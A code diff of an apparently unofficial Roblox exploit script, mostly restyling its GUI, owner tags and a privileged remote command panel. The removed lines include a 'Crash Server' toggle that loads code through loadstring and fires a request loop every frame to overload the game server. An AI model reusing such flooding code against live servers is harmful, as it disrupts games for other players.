-    if state.running then return end
-    state.running = true
-    state.cache = nil
-    state.thread = task.spawn(function()
-        while state.running do
-            pcall(fire)
-            if FrameDelay > 0 then
-                task.wait(FrameDelay)
-            else
-                RunService.Heartbeat:Wait()
-            end
-        end
+local function SetToggleVisual(btn, isOn)
+    btn:SetAttribute("On", isOn)
+    Tween(btn, {BackgroundColor3 = isOn and Colors.SurfaceOn or Colors.Surface}, EaseOut)
+    Tween(btn, {TextColor3   = isOn and Colors.Accent    or Colors.Text},     EaseOut)
+end
+
+--//======================================================
+--// BUILD UI
+--//======================================================
+local y = 62
+
+MakeSectionLabel("VISUALS", y)
+y = y + SectionHeight + 4
+
+local NameColorButton = MakeButton("Name Color", y)
+y = y + ButtonHeight + ButtonGap
+
+local FontButton = MakeButton("Font Changer", y)
+y = y + ButtonHeight + ButtonGap
+
+local FastLvlHiderButton = MakeButton("Fast Lvl Hider", y)
+y = y + ButtonHeight + ButtonGap + 4
+
+MakeSectionLabel("UTILITIES", y)
+y = y + SectionHeight + 4
+
+local InvisibleNameButton = MakeButton("Invisible Name  [0/6]", y)
+y = y + ButtonHeight + ButtonGap
+
+local CoffeeButton = MakeButton("☕  Get Coffee", y)
+y = y + ButtonHeight + ButtonGap
+
+local DiscordButton = MakeButton("☁  Join Discord", y)
+y = y + ButtonHeight + ButtonGap + 4
+
+local SecretButton
+if CanUseSecret then
+    MakeSectionLabel("PRIVILEGED", y)
+    y = y + SectionHeight + 4
+
+    SecretButton = MakeButton("🔒  Secret Commands", y)
+    SecretButton.TextColor3 = Colors.Gold
+    SecretButton:SetAttribute("On", true)
+    SecretButton.BackgroundColor3 = Color3.fromRGB(20, 30, 55)
+
+    local SS = Instance.new("UIStroke")
+    SS.Color = Colors.Gold
+    SS.Transparency = 0.6
+    SS.Parent = SecretButton
+
+    SecretButton.MouseEnter:Connect(function()
+        Tween(SecretButton, {BackgroundColor3 = Color3.fromRGB(30, 45, 80)}, EaseOutFast)
+    end)
+    SecretButton.MouseLeave:Connect(function()
+        Tween(SecretButton, {BackgroundColor3 = Color3.fromRGB(20, 30, 55)}, EaseOutFast)
     end)
 end
 
-local function stop()
-    state.running = false
-    if state.thread then pcall(task.cancel, state.thread) end
-    state.thread = nil
-    state.cache = nil
-end
+local Footer = Instance.new("TextLabel")
+Footer.AnchorPoint = Vector2.new(0, 1)
+Footer.Position = UDim2.new(0, 16, 1, -12)
+Footer.Size = UDim2.new(1, -32, 0, 16)
+Footer.BackgroundTransparency = 1
+Footer.Text = "Requests: 0"
+Footer.TextColor3 = Colors.TextDim
+Footer.TextSize = 10
+Footer.Font = Enum.Font.Gotham
+Footer.TextXAlignment = Enum.TextXAlignment.Left
+Footer.Parent = Main
 
-return {
-    start  = start,
-    stop   = stop,
-    toggle = function() if state.running then stop() else start() end end,
-    isRunning = function() return state.running end,
-}
-]==]
+--//======================================================
+--// OPEN FLOATING BUTTON
+--//======================================================
+local OpenButton = Instance.new("TextButton")
+OpenButton.Size = UDim2.new(0, 56, 0, 32)
+OpenButton.Position = UDim2.new(0, 16, 0, 16)
+OpenButton.BackgroundColor3 = Colors.Bg
+OpenButton.BackgroundTransparency = 0.05
+OpenButton.BorderSizePixel = 0
+OpenButton.Text = "Open"
+OpenButton.TextColor3 = Colors.Text
+OpenButton.TextSize = 12
+OpenButton.Font = Enum.Font.GothamBold
+OpenButton.AutoButtonColor = false
+OpenButton.Visible = false
+OpenButton.Parent = ScreenGui
 
-local CrashAPI = nil
-do
-    local chunk = loadstring(CrashSource)
-    if chunk then
-        local ok, result = pcall(chunk)
-        if ok and type(result) == "table" then
-            CrashAPI = result
-        end
-    end
-end
+local OpenCorner = Instance.new("UICorner")
+OpenCorner.CornerRadius = UDim.new(0, 10)
+OpenCorner.Parent = OpenButton
 
-local CrashEnabled = false
+local OpenStroke = Instance.new("UIStroke")
+OpenStroke.Color = Colors.Border
+OpenStroke.Parent = OpenButton
 
-CrashServerButton.MouseButton1Click:Connect(function()
-    if not CrashAPI then return end
+OpenButton.MouseEnter:Connect(function()
+    Tween(OpenButton, {BackgroundColor3 = Colors.SurfaceHi}, EaseOutFast)
+end)
+OpenButton.MouseLeave:Connect(function()
+    Tween(OpenButton, {BackgroundColor3 = Colors.Bg}, EaseOutFast)
+end)
 
-    CrashEnabled = not CrashEnabled
+CloseBtn.MouseButton1Click:Connect(function()
+    Main.Visible = false
+    OpenButton.Visible = true
+end)
 
-    if CrashEnabled then
-        CrashServerButton.Text = "Crash Server ❗❗: ON"
-        pcall(CrashAPI.start)
-    else
-        CrashServerButton.Text = "Crash Server ❗❗: OFF"
-        pcall(CrashAPI.stop)
-    end
+OpenButton.MouseButton1Click:Connect(function()
+    Main.Visible = true
+    OpenButton.Visible = false
 end)
 
 --//======================================================
 --// SECRET COMMANDS PANEL
 --//======================================================
-
-local SecretButton
 local SecretPanel
 
 if CanUseSecret then
-	SecretButton = MakeButton("🔒 SECRET COMMANDS", 351, 34)
-	SecretButton.TextColor3 = Color3.fromRGB(255, 255, 0)
+    SecretPanel = Instance.new("Frame")
+    SecretPanel.Name = "SecretPanel"
+    SecretPanel.Size = UDim2.new(0, 300, 0, 330)
+    SecretPanel.Position = UDim2.new(0.5, -150, 0.5, -165)
+    SecretPanel.BackgroundColor3 = Colors.Bg
+    SecretPanel.BackgroundTransparency = 0.05
+    SecretPanel.BorderSizePixel = 0
+    SecretPanel.Visible = false
+    SecretPanel.ZIndex = 200
+    SecretPanel.Parent = ScreenGui
 
-	local SecretStroke = Instance.new("UIStroke")
-	SecretStroke.Color = Color3.fromRGB(255, 255, 0)
-	SecretStroke.Transparency = 0.2
-	SecretStroke.Parent = SecretButton
+    local PC = Instance.new("UICorner")
+    PC.CornerRadius = UDim.new(0, 16)
+    PC.Parent = SecretPanel
 
-	SecretPanel = Instance.new("Frame")
-	SecretPanel.Name = "SecretPanel"
-	SecretPanel.Size = UDim2.new(0, 295, 0, 330)
-	SecretPanel.Position = UDim2.new(0.5, -147, 0.5, -165)
-	SecretPanel.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	SecretPanel.BorderSizePixel = 0
-	SecretPanel.Visible = false
-	SecretPanel.ZIndex = 200
-	SecretPanel.Parent = ScreenGui
+    local PS = Instance.new("UIStroke")
+    PS.Color = Colors.Gold
+    PS.Transparency = 0.3
+    PS.Parent = SecretPanel
 
-	local PC = Instance.new("UICorner")
-	PC.CornerRadius = UDim.new(0, 14)
-	PC.Parent = SecretPanel
+    local ST = Instance.new("TextLabel")
+    ST.Size = UDim2.new(1, -50, 0, 26)
+    ST.Position = UDim2.new(0, 16, 0, 14)
+    ST.BackgroundTransparency = 1
+    ST.Text = "🔒  SECRET COMMANDS"
+    ST.TextColor3 = Colors.Gold
+    ST.TextSize = 14
+    ST.Font = Enum.Font.GothamBold
+    ST.TextXAlignment = Enum.TextXAlignment.Left
+    ST.ZIndex = 201
+    ST.Parent = SecretPanel
 
-	local PS = Instance.new("UIStroke")
-	PS.Color = Color3.fromRGB(255, 255, 0)
-	PS.Thickness = 1.5
-	PS.Parent = SecretPanel
+    local SC = Instance.new("TextButton")
+    SC.Size = UDim2.new(0, 28, 0, 28)
+    SC.Position = UDim2.new(1, -40, 0, 10)
+    SC.BackgroundColor3 = Colors.Surface
+    SC.BorderSizePixel = 0
+    SC.Text = "×"
+    SC.TextColor3 = Colors.TextDim
+    SC.TextSize = 18
+    SC.Font = Enum.Font.GothamBold
+    SC.AutoButtonColor = false
+    SC.ZIndex = 201
+    SC.Parent = SecretPanel
+    local SCC = Instance.new("UICorner")
+    SCC.CornerRadius = UDim.new(0, 8)
+    SCC.Parent = SC
 
-	local ST = Instance.new("TextLabel")
-	ST.Size = UDim2.new(1, -50, 0, 30)
-	ST.Position = UDim2.new(0, 14, 0, 8)
-	ST.BackgroundTransparency = 1
-	ST.Text = "🔒 SECRET COMMANDS"
-	ST.TextColor3 = Color3.fromRGB(255, 255, 0)
-	ST.TextSize = 15
-	ST.Font = Enum.Font.GothamBold
-	ST.TextXAlignment = Enum.TextXAlignment.Left
-	ST.ZIndex = 201
-	ST.Parent = SecretPanel
+    local CommandBox = Instance.new("TextBox")
+    CommandBox.Size = UDim2.new(1, -32, 0, 42)
+    CommandBox.Position = UDim2.new(0, 16, 0, 52)
+    CommandBox.BackgroundColor3 = Colors.Surface
+    CommandBox.BorderSizePixel = 0
+    CommandBox.PlaceholderText = ":alert Message"
+    CommandBox.PlaceholderColor3 = Colors.TextDim
+    CommandBox.Text = ""
+    CommandBox.TextColor3 = Colors.Text
+    CommandBox.TextSize = 12
+    CommandBox.Font = Enum.Font.Code
+    CommandBox.TextXAlignment = Enum.TextXAlignment.Left
+    CommandBox.ClearTextOnFocus = false
+    CommandBox.ZIndex = 201
+    CommandBox.Parent = SecretPanel
 
-	local SC = Instance.new("TextButton")
-	SC.Size = UDim2.new(0, 30, 0, 30)
-	SC.Position = UDim2.new(1, -38, 0, 7)
-	SC.BackgroundTransparency = 1
-	SC.Text = "×"
-	SC.TextColor3 = Color3.fromRGB(255, 255, 255)
-	SC.TextSize = 22
-	SC.Font = Enum.Font.GothamBold
-	SC.ZIndex = 201
-	SC.Parent = SecretPanel
+    local CPC = Instance.new("UICorner")
+    CPC.CornerRadius = UDim.new(0, 9)
+    CPC.Parent = CommandBox
 
-	local CommandBox = Instance.new("TextBox")
-	CommandBox.Size = UDim2.new(1, -24, 0, 44)
-	CommandBox.Position = UDim2.new(0, 12, 0, 52)
-	CommandBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	CommandBox.BackgroundTransparency = 0.1
-	CommandBox.BorderSizePixel = 0
-	CommandBox.PlaceholderText = ":alert Message"
-	CommandBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
-	CommandBox.Text = ""
-	CommandBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-	CommandBox.TextSize = 12
-	CommandBox.Font = Enum.Font.Code
-	CommandBox.ClearTextOnFocus = false
-	CommandBox.ZIndex = 201
-	CommandBox.Parent = SecretPanel
+    local CPD = Instance.new("UIPadding")
+    CPD.PaddingLeft = UDim.new(0, 12)
+    CPD.Parent = CommandBox
 
-	local CC = Instance.new("UICorner")
-	CC.CornerRadius = UDim.new(0, 9)
-	CC.Parent = CommandBox
+    local Execute = Instance.new("TextButton")
+    Execute.Size = UDim2.new(1, -32, 0, 34)
+    Execute.Position = UDim2.new(0, 16, 0, 102)
+    Execute.BackgroundColor3 = Colors.Gold
+    Execute.BorderSizePixel = 0
+    Execute.Text = "EXECUTE"
+    Execute.TextColor3 = Color3.fromRGB(10, 18, 30)
+    Execute.TextSize = 12
+    Execute.Font = Enum.Font.GothamBold
+    Execute.AutoButtonColor = false
+    Execute.ZIndex = 201
+    Execute.Parent = SecretPanel
 
-	local Execute = Instance.new("TextButton")
-	Execute.Size = UDim2.new(1, -24, 0, 36)
-	Execute.Position = UDim2.new(0, 12, 0, 104)
-	Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-	Execute.BorderSizePixel = 0
-	Execute.Text = "EXECUTE"
-	Execute.TextColor3 = Color3.fromRGB(0, 0, 0)
-	Execute.TextSize = 12
-	Execute.Font = Enum.Font.GothamBold
-	Execute.ZIndex = 201
-	Execute.Parent = SecretPanel
+    local EC = Instance.new("UICorner")
+    EC.CornerRadius = UDim.new(0, 9)
+    EC.Parent = Execute
 
-	local EC = Instance.new("UICorner")
-	EC.CornerRadius = UDim.new(0, 9)
-	EC.Parent = Execute
+    Execute.MouseEnter:Connect(function()
+        Tween(Execute, {BackgroundColor3 = Color3.fromRGB(140, 220, 255)}, EaseOutFast)
+    end)
+    Execute.MouseLeave:Connect(function()
+        Tween(Execute, {BackgroundColor3 = Colors.Gold}, EaseOutFast)
+    end)
 
-	local Help = Instance.new("TextLabel")
-	Help.Size = UDim2.new(1, -24, 0, 175)
-	Help.Position = UDim2.new(0, 12, 0, 150)
-	Help.BackgroundTransparency = 1
-	Help.Text =
-		":alert Message\n\n" ..
-		":tag PlayerName Custom Tag\n\n" ..
-		":untag PlayerName\n\n" ..
-		"📢 ALERT = GLOBAL\n" ..
-		"🏷️ TAG = PERMANENT\n" ..
-		"🟢 Target must be using the script"
-	Help.TextColor3 = Color3.fromRGB(190, 190, 190)
-	Help.TextSize = 11
-	Help.Font = Enum.Font.Code
-	Help.TextXAlignment = Enum.TextXAlignment.Left
-	Help.TextYAlignment = Enum.TextYAlignment.Top
-	Help.ZIndex = 201
-	Help.Parent = SecretPanel
+    local Help = Instance.new("TextLabel")
+    Help.Size = UDim2.new(1, -32, 0, 170)
+    Help.Position = UDim2.new(0, 16, 0, 148)
+    Help.BackgroundTransparency = 1
+    Help.Text =
+        ":alert Message\n\n" ..
+        ":tag PlayerName Custom Tag\n\n" ..
+        ":untag PlayerName\n\n" ..
+        "📢 ALERT = GLOBAL\n" ..
+        "🏷️ TAG = PERMANENT\n" ..
+        "🟢 Target must be using the script"
+    Help.TextColor3 = Colors.TextDim
+    Help.TextSize = 11
+    Help.Font = Enum.Font.Code
+    Help.TextXAlignment = Enum.TextXAlignment.Left
+    Help.TextYAlignment = Enum.TextYAlignment.Top
+    Help.TextWrapped = true
+    Help.ZIndex = 201
+    Help.Parent = SecretPanel
 
-	SecretButton.MouseButton1Click:Connect(function()
-		Main.Visible = false
-		SecretPanel.Visible = true
-	end)
+    SecretButton.MouseButton1Click:Connect(function()
+        Main.Visible = false
+        SecretPanel.Visible = true
+    end)
 
-	SC.MouseButton1Click:Connect(function()
-		SecretPanel.Visible = false
-		Main.Visible = true
-	end)
+    SC.MouseButton1Click:Connect(function()
+        SecretPanel.Visible = false
+        Main.Visible = true
+    end)
 
-	local function ExecuteCommand()
-		if not CommandRemote then
-			Notify("COMMAND REMOTE NOT FOUND", "Left")
-			return
-		end
+    local function ExecuteCommand()
+        if not CommandRemote then
+            Notify("COMMAND REMOTE NOT FOUND", "Left")
+            return
+        end
+        local cmd = CommandBox.Text
+        if cmd == "" then return end
+        CommandRemote:FireServer(cmd)
+        CommandBox.Text = ""
+    end
 
-		local Command = CommandBox.Text
-		if Command == "" then return end
-
-		CommandRemote:FireServer(Command)
-		CommandBox.Text = ""
-	end
-
-	Execute.MouseButton1Click:Connect(ExecuteCommand)
-	CommandBox.FocusLost:Connect(function(EnterPressed)
-		if EnterPressed then ExecuteCommand() end
-	end)
+    Execute.MouseButton1Click:Connect(ExecuteCommand)
+    CommandBox.FocusLost:Connect(function(enter)
+        if enter then ExecuteCommand() end
+    end)
 end
 
 --//======================================================
---// CLOSE / OPEN
+--// TAG SYSTEM (owner tags w/ BLUE /2v6 typewriter caption)
 --//======================================================
-
-local CloseButton = Instance.new("TextButton")
-CloseButton.Size = UDim2.new(0, 28, 0, 28)
-CloseButton.Position = UDim2.new(1, -34, 0, 7)
-CloseButton.BackgroundTransparency = 1
-CloseButton.Text = "×"
-CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.TextSize = 22
-CloseButton.Font = Enum.Font.GothamBold
-CloseButton.Parent = Main
-
-local OpenButton = Instance.new("TextButton")
-OpenButton.Size = UDim2.new(0, 52, 0, 35)
-OpenButton.Position = UDim2.new(0, 10, 0, 10)
-OpenButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-OpenButton.BorderSizePixel = 0
-OpenButton.Text = "Open"
-OpenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-OpenButton.TextSize = 11
-OpenButton.Font = Enum.Font.GothamBold
-OpenButton.Visible = false
-OpenButton.Parent = ScreenGui
-
-local OC = Instance.new("UICorner")
-OC.CornerRadius = UDim.new(0, 9)
-OC.Parent = OpenButton
-
-CloseButton.MouseButton1Click:Connect(function()
-	Main.Visible = false
-	OpenButton.Visible = true
-end)
-
-OpenButton.MouseButton1Click:Connect(function()
-	Main.Visible = true
-	OpenButton.Visible = false
-end)
-
---//======================================================
---// TAG SYSTEM
---//======================================================
-
 local function RemoveTag(Target, Name)
-	if not Target or not Target.Character then return end
-	local Head = Target.Character:FindFirstChild("Head")
-	if not Head then return end
+    if not Target or not Target.Character then return end
+    local Head = Target.Character:FindFirstChild("Head")
+    if not Head then return end
+    local Tag = Head:FindFirstChild(Name)
+    if Tag and Tag:IsA("BillboardGui") and Tag:GetAttribute("LazerSpecialTag") == true then
+        Tag:Destroy()
+    end
+end
 
-	local Tag = Head:FindFirstChild(Name)
-	if Tag and Tag:IsA("BillboardGui") and Tag:GetAttribute("LazerSpecialTag") == true then
-		Tag:Destroy()
-	end
+local function RunTypewriter(label, message)
+    task.spawn(function()
+        local TYPE_SPEED  = 0.09
+        local ERASE_SPEED = 0.045
+        local HOLD_TIME   = 2.2
+        local PAUSE_TIME  = 0.6
+        local BLINK       = 0.35
+
+        while label.Parent do
+            for i = 1, #message do
+                if not label.Parent then return end
+                label.Text = string.sub(message, 1, i)
+                task.wait(TYPE_SPEED)
+            end
+
+            local t = 0
+            while t < HOLD_TIME do
+                if not label.Parent then return end
+                label.Text = message .. ((math.floor(t / BLINK) % 2 == 0) and "|" or "")
+                task.wait(BLINK)
+                t = t + BLINK
+            end
+
+            for i = #message, 0, -1 do
+                if not label.Parent then return end
+                label.Text = string.sub(message, 1, i)
+                task.wait(ERASE_SPEED)
+            end
+
+            task.wait(PAUSE_TIME)
+        end
+    end)
 end
 
 local function MakeTag(Target, Name, Text, Color, Size)
-	if not Target then return end
-	local Character = Target.Character
-	if not Character then return end
+    if not Target then return end
+    local Character = Target.Character
+    if not Character then return end
+    local Head = Character:FindFirstChild("Head") or Character:WaitForChild("Head", 5)
+    if not Head then return end
 
-	local Head = Character:FindFirstChild("Head") or Character:WaitForChild("Head", 5)
-	if not Head then return end
+    RemoveTag(Target, Name)
 
-	RemoveTag(Target, Name)
+    local Billboard = Instance.new("BillboardGui")
+    Billboard.Name = Name
+    Billboard:SetAttribute("LazerSpecialTag", true)
+    Billboard.Adornee = Head
+    Billboard.AlwaysOnTop = true
+    Billboard.LightInfluence = 0
+    Billboard.MaxDistance = 250
+    Billboard.ResetOnSpawn = false
+    Billboard.Parent = Head
 
-	local Billboard = Instance.new("BillboardGui")
-	Billboard.Name = Name
-	Billboard:SetAttribute("LazerSpecialTag", true)
-	Billboard.Adornee = Head
-	Billboard.AlwaysOnTop = true
-	Billboard.LightInfluence = 0
-	Billboard.MaxDistance = 250
-	Billboard.ResetOnSpawn = false
-	Billboard.StudsOffset = Vector3.new(0, 4, 0)
-	Billboard.Size = UDim2.new(0, 220, 0, 45)
-	Billboard.Parent = Head
+    if Name == USER_TAG then
+        Billboard.StudsOffset = Vector3.new(0, 4, 0)
+        Billboard.Size = UDim2.new(0, 220, 0, 45)
 
-	if Name == USER_TAG then
-		local Label = Instance.new("TextLabel")
-		Label.Name = "ScriptUserEmoji"
-		Label.Size = UDim2.fromScale(1, 1)
-		Label.BackgroundTransparency = 1
-		Label.Text = "🟢"
-		Label.TextColor3 = Color3.fromRGB(0, 255, 0)
-		Label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-		Label.TextStrokeTransparency = 0
-		Label.TextSize = 32
-		Label.Font = Enum.Font.GothamBold
-		Label.TextXAlignment = Enum.TextXAlignment.Center
-		Label.TextYAlignment = Enum.TextYAlignment.Center
-		Label.Parent = Billboard
-	else
-		local Label = Instance.new("TextLabel")
-		Label.Name = "OwnerNameTag"
-		Label.Size = UDim2.fromScale(1, 1)
-		Label.BackgroundTransparency = 1
-		Label.Text = Text
-		Label.TextColor3 = Color
-		Label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-		Label.TextStrokeTransparency = 0.15
-		Label.TextSize = Size
-		Label.Font = Enum.Font.GothamBold
-		Label.TextXAlignment = Enum.TextXAlignment.Center
-		Label.TextYAlignment = Enum.TextYAlignment.Center
-		Label.Parent = Billboard
-	end
+        local Label = Instance.new("TextLabel")
+        Label.Name = "ScriptUserEmoji"
+        Label.Size = UDim2.fromScale(1, 1)
+        Label.BackgroundTransparency = 1
+        Label.Text = "🟢"
+        Label.TextColor3 = Color3.fromRGB(0, 255, 0)
+        Label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        Label.TextStrokeTransparency = 0
+        Label.TextSize = 32
+        Label.Font = Enum.Font.GothamBold
+        Label.TextXAlignment = Enum.TextXAlignment.Center
+        Label.TextYAlignment = Enum.TextYAlignment.Center
+        Label.Parent = Billboard
+        return
+    end
+
+    -- Lowered offset (was 5.5) so both the 👑 OWNER name and /2v6 caption sit lower
+    Billboard.StudsOffset = Vector3.new(0, 4.8, 0)
+    Billboard.Size = UDim2.new(0, 270, 0, 74)
+
+    local NameLabel = Instance.new("TextLabel")
+    NameLabel.Name = "OwnerNameTag"
+    NameLabel.Size = UDim2.new(1, 0, 0, 42)
+    NameLabel.Position = UDim2.new(0, 0, 0, 0)
+    NameLabel.BackgroundTransparency = 1
+    NameLabel.Text = Text
+    NameLabel.TextColor3 = Color
+    NameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    NameLabel.TextStrokeTransparency = 0.15
+    NameLabel.TextSize = Size
+    NameLabel.Font = Enum.Font.GothamBold
+    NameLabel.TextXAlignment = Enum.TextXAlignment.Center
+    NameLabel.TextYAlignment = Enum.TextYAlignment.Center
+    NameLabel.Parent = Billboard
+
+    local Caption = Instance.new("TextLabel")
+    Caption.Name = "JoinCaption"
+    Caption.Size = UDim2.new(1, 0, 0, 28)
+    Caption.Position = UDim2.new(0, 0, 0, 42)
+    Caption.BackgroundTransparency = 1
+    Caption.Text = ""
+    Caption.TextColor3 = Color3.fromRGB(100, 200, 255)
+    Caption.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    Caption.TextStrokeTransparency = 0
+    Caption.TextSize = 18
+    Caption.Font = Enum.Font.GothamBlack
+    Caption.TextXAlignment = Enum.TextXAlignment.Center
+    Caption.TextYAlignment = Enum.TextYAlignment.Center
+    Caption.Parent = Billboard
+
+    RunTypewriter(Caption, "☁ join /2v6")
 end
 
 local function MakeCustomTag(Target, Text)
-	if not Target or not Target.Character then return end
-	local Head = Target.Character:FindFirstChild("Head")
-	if not Head then return end
+    if not Target or not Target.Character then return end
+    local Head = Target.Character:FindFirstChild("Head")
+    if not Head then return end
+    RemoveTag(Target, CUSTOM_TAG)
 
-	RemoveTag(Target, CUSTOM_TAG)
+    local Billboard = Instance.new("BillboardGui")
+    Billboard.Name = CUSTOM_TAG
+    Billboard:SetAttribute("LazerSpecialTag", true)
+    Billboard.Adornee = Head
+    Billboard.AlwaysOnTop = true
+    Billboard.LightInfluence = 0
+    Billboard.MaxDistance = 250
+    Billboard.ResetOnSpawn = false
+    Billboard.StudsOffset = Vector3.new(0, 5.05, 0)
+    Billboard.Size = UDim2.new(0, 300, 0, 45)
+    Billboard.Parent = Head
 
-	local Billboard = Instance.new("BillboardGui")
-	Billboard.Name = CUSTOM_TAG
-	Billboard:SetAttribute("LazerSpecialTag", true)
-	Billboard.Adornee = Head
-	Billboard.AlwaysOnTop = true
-	Billboard.LightInfluence = 0
-	Billboard.MaxDistance = 250
-	Billboard.ResetOnSpawn = false
-	Billboard.StudsOffset = Vector3.new(0, 5.05, 0)
-	Billboard.Size = UDim2.new(0, 300, 0, 45)
-	Billboard.Parent = Head
-
-	local Label = Instance.new("TextLabel")
-	Label.Name = "PermanentCustomTag"
-	Label.Size = UDim2.fromScale(1, 1)
-	Label.BackgroundTransparency = 1
-	Label.Text = tostring(Text)
-	Label.TextColor3 = Color3.fromRGB(255, 255, 255)
-	Label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-	Label.TextStrokeTransparency = 0
-	Label.TextSize = 20
-	Label.Font = Enum.Font.GothamBold
-	Label.TextXAlignment = Enum.TextXAlignment.Center
-	Label.TextYAlignment = Enum.TextYAlignment.Center
-	Label.Parent = Billboard
+    local Label = Instance.new("TextLabel")
+    Label.Name = "PermanentCustomTag"
+    Label.Size = UDim2.fromScale(1, 1)
+    Label.BackgroundTransparency = 1
+    Label.Text = tostring(Text)
+    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    Label.TextStrokeTransparency = 0
+    Label.TextSize = 20
+    Label.Font = Enum.Font.GothamBold
+    Label.TextXAlignment = Enum.TextXAlignment.Center
+    Label.TextYAlignment = Enum.TextYAlignment.Center
+    Label.Parent = Billboard
 end
 
 local function UpdateCustomTags()
-	for UserId, Text in pairs(CustomTags) do
-		local Target = Players:GetPlayerByUserId(UserId)
-		if Target then
-			MakeCustomTag(Target, Text)
-		end
-	end
+    for UserId, Text in pairs(CustomTags) do
+        local Target = Players:GetPlayerByUserId(UserId)
+        if Target then MakeCustomTag(Target, Text) end
+    end
 end
 
 local function UpdateTags()
-	for _, Target in ipairs(Players:GetPlayers()) do
-		if Target.Name == OWNER_USERNAME then
-			MakeTag(Target, OWNER_TAG, "👑 OWNER", Color3.fromRGB(255, 255, 0), 23)
-			RemoveTag(Target, CO_OWNER_TAG)
-			RemoveTag(Target, USER_TAG)
-		elseif Target.Name == CO_OWNER_USERNAME then
-			MakeTag(Target, CO_OWNER_TAG, "👑 CO OWNER", Color3.fromRGB(255, 255, 0), 21)
-			RemoveTag(Target, OWNER_TAG)
-			RemoveTag(Target, USER_TAG)
-		elseif RegisteredPlayers[Target.UserId] then
-			MakeTag(Target, USER_TAG, "🟢", Color3.fromRGB(0, 255, 0), 32)
-			RemoveTag(Target, OWNER_TAG)
-			RemoveTag(Target, CO_OWNER_TAG)
-		else
-			RemoveTag(Target, OWNER_TAG)
-			RemoveTag(Target, CO_OWNER_TAG)
-			RemoveTag(Target, USER_TAG)
-		end
-	end
-
-	UpdateCustomTags()
+    for _, Target in ipairs(Players:GetPlayers()) do
+        if Target.Name == OWNER_USERNAME then
+            MakeTag(Target, OWNER_TAG, "👑 OWNER", Color3.fromRGB(255, 255, 0), 23)
+            RemoveTag(Target, CO_OWNER_TAG); RemoveTag(Target, USER_TAG)
+        elseif Target.Name == CO_OWNER_USERNAME then
+            MakeTag(Target, CO_OWNER_TAG, "👑 CO OWNER", Color3.fromRGB(255, 255, 0), 21)
+            RemoveTag(Target, OWNER_TAG); RemoveTag(Target, USER_TAG)
+        elseif RegisteredPlayers[Target.UserId] then
+            MakeTag(Target, USER_TAG, "🟢", Color3.fromRGB(0, 255, 0), 32)
+            RemoveTag(Target, OWNER_TAG); RemoveTag(Target, CO_OWNER_TAG)
+        else
+            RemoveTag(Target, OWNER_TAG); RemoveTag(Target, CO_OWNER_TAG); RemoveTag(Target, USER_TAG)
+        end
+    end
+    UpdateCustomTags()
 end
 
 --//======================================================
 --// PLAYER SETUP
 --//======================================================
-
 local function SetupPlayer(Target)
-	Target.CharacterAdded:Connect(function(Character)
-		local Head = Character:WaitForChild("Head", 10)
-		if not Head then return end
-		task.wait(0.75)
-		UpdateTags()
-	end)
-
-	if Target.Character then
-		task.spawn(function()
-			local Head = Target.Character:WaitForChild("Head", 10)
-			if not Head then return end
-			task.wait(0.75)
-			UpdateTags()
-		end)
-	end
+    Target.CharacterAdded:Connect(function(Character)
+        local Head = Character:WaitForChild("Head", 10)
+        if not Head then return end
+        task.wait(0.75)
+        UpdateTags()
+    end)
+    if Target.Character then
+        task.spawn(function()
+            local Head = Target.Character:WaitForChild("Head", 10)
+            if not Head then return end
+            task.wait(0.75)
+            UpdateTags()
+        end)
+    end
 end
 
-for _, Target in ipairs(Players:GetPlayers()) do
-	SetupPlayer(Target)
-end
+for _, Target in ipairs(Players:GetPlayers()) do SetupPlayer(Target) end
 
 --//======================================================
 --// REGISTER REMOTE
 --//======================================================
-
 task.spawn(function()
-	RegisterRemote = ReplicatedStorage:WaitForChild(REGISTER_REMOTE_NAME, 15)
-	if not RegisterRemote then return end
+    RegisterRemote = ReplicatedStorage:WaitForChild(REGISTER_REMOTE_NAME, 15)
+    if not RegisterRemote then return end
 
-	RegisterRemote.OnClientEvent:Connect(function(Action, Data)
-		if Action == "RegisteredList" and typeof(Data) == "table" then
-			table.clear(RegisteredPlayers)
-			for _, Info in ipairs(Data) do
-				if typeof(Info) == "table" and typeof(Info.UserId) == "number" then
-					RegisteredPlayers[Info.UserId] = true
-				end
-			end
-			UpdateTags()
-		elseif Action == "PlayerRegistered" and typeof(Data) == "table" then
-			if typeof(Data.UserId) == "number" then
-				RegisteredPlayers[Data.UserId] = true
-				UpdateTags()
-				if Data.UserId ~= Player.UserId then
-					Notify("🟢 Script user joined", "Right")
-				end
-			end
-		end
-	end)
+    RegisterRemote.OnClientEvent:Connect(function(Action, Data)
+        if Action == "RegisteredList" and typeof(Data) == "table" then
+            table.clear(RegisteredPlayers)
+            for _, Info in ipairs(Data) do
+                if typeof(Info) == "table" and typeof(Info.UserId) == "number" then
+                    RegisteredPlayers[Info.UserId] = true
+                end
+            end
+            UpdateTags()
+        elseif Action == "PlayerRegistered" and typeof(Data) == "table" then
+            if typeof(Data.UserId) == "number" then
+                RegisteredPlayers[Data.UserId] = true
+                UpdateTags()
+                if Data.UserId ~= Player.UserId then
+                    Notify("🟢 Script user joined", "Right")
+                end
+            end
+        end
+    end)
 
-	RegisterRemote:FireServer("Register")
+    RegisterRemote:FireServer("Register")
 end)
 
 --//======================================================
 --// COMMAND REMOTE
 --//======================================================
-
 task.spawn(function()
-	CommandRemote = ReplicatedStorage:WaitForChild(COMMAND_REMOTE_NAME, 15)
-	if not CommandRemote then return end
+    CommandRemote = ReplicatedStorage:WaitForChild(COMMAND_REMOTE_NAME, 15)
+    if not CommandRemote then return end
 
-	CommandRemote.OnClientEvent:Connect(function(Action, TargetUserId, Data)
-		if Action == "Alert" then
-			ShowGlobalAlert(tostring(Data))
-			return
-		end
-
